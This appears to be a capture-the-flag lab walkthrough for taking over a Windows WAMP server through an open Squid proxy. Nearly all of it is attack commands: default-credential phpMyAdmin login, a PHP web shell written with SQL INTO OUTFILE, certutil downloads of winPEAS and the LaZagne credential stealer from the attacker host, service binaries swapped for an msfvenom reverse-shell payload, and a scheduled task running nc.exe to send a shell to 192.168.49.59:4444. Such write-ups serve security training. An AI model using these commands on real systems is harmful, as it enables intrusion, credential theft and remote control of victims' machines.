### Hacktricks spose
```bash
❯ python3 spose.py --proxy http://192.168.59.189:3128 --target 192.168.59.189
Using proxy address http://192.168.59.189:3128
192.168.59.189 3306 seems OPEN 
192.168.59.189 8080 seems OPEN 
```
https://github.com/A1vinSmith/spose

### Curl
```bash
curl --proxy http://192.168.59.189:3128 http://192.168.59.189:8080
```

Working tho, Better to go with FoxyProxy. 

Also check another repo if Squid ask for Auth. https://github.com/A1vinSmith/Cloud-Hacking/tree/main/HackTheBox/Flustered#auth-squid

### Phpmyadmin
http://192.168.59.189:8080/phpmyadmin/index.php

root as default creds will let you in

### Phpinfo and shell
`C:/wamp/www/index.php`

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/wamp/www/alvin1.php';
```

### Foothold get
```
certutil -urlcache -f http://192.168.49.59/winPEASx64.exe winPEASx64.exe

certutil -urlcache -f http://192.168.49.59/lazagne.exe lazagne.exe
```

### winpeas
```bash
.\winPEASx64.exe cmd fast > C:/wamp/www/winpeas_fast

curl --proxy http://192.168.59.189:3128 http://192.168.59.189:8080/winpeas_fast > winpeas_fast
```

##### sed
```bash
sed -n -e 1,500p winpeas_fast       -> Kernel exploit
sed -n -e 500,1000p winpeas_fast
sed -n -e 1000,1500p winpeas_fast
sed -n -e 1500,2000p winpeas_fast   -> Unquoted path
```

```txt
Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    ApacheHTTPServer(Apache Software Foundation - Apache HTTP Server)["C:\wamp\bin\apache\apache2.4.46\bin\httpd.exe" -k runservice] - Auto - Running
    Possible DLL Hijacking in binary folder: C:\wamp\bin\apache\apache2.4.46\bin (Everyone [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Apache/2.4.46 (Win64)
   =================================================================================================

    MySQL(MySQL)[C:\wamp\bin\mysql\mysql5.7.31\bin\mysqld.exe MySQL] - Auto - Running - No quotes and Space detected
    Possible DLL Hijacking in binary folder: C:\wamp\bin\mysql\mysql5.7.31\bin (Everyone [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles])
   =================================================================================================

    squidsrv(Squid for Windows)[C:\Squid\bin\Diladele.Squid.Service.exe] - Auto - Running - isDotNet
    Possible DLL Hijacking in binary folder: C:\Squid\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Reduces bandwidth and improves response times by caching and reusing frequently-requested web pages.
```
    
```
move C:\wamp\bin\apache\apache2.4.46\bin\httpd.exe C:\wamp\bin\apache\apache2.4.46\bin\httpd.backup
certutil -urlcache -f http://192.168.49.59/httpd.exe C:\wamp\bin\apache\apache2.4.46\bin\httpd.exe

move C:\Squid\bin\Diladele.Squid.Service.exe C:\Squid\bin\Diladele.Squid.Service.backup
certutil -urlcache -f http://192.168.49.59/Diladele.Squid.Service.exe C:\Squid\bin\Diladele.Squid.Service.exe

move C:\wamp\bin\mysql\mysql5.7.31\bin\mysqld.exe C:\wamp\bin\mysql\mysql5.7.31\bin\mysqld.backup
certutil -urlcache -f http://192.168.49.59/mysqld.exe C:\wamp\bin\mysql\mysql5.7.31\bin\mysqld.exe


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.59 LPORT=3306 -f exe -o httpd.exe
```
```
certutil -urlcache -f http://192.168.49.59/AppXSVC_poc_x64.exe AppXSVC_poc_x64.exe

.\AppXSVC_poc_x64.exe c:\windows\system.ini
```

### Stuck so go for hint
 Privilege Escalation

A scheduled task can be created to gain default permissions and another task can be created to gain SeImpersonatePrivilege. 

```
schtasks /query /fo LIST /v

PS C:\wamp\www> Get-ScheduledTask | select TaskName,State

C:\windows\tasks
```
# Root with unique powershell bypass skill
```
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.49.59 4444 -e cmd.exe`""
```

```
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.49.59 4444 -e cmd.exe`""
```
```
Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms1" -Principal $TaskPrincipal
```
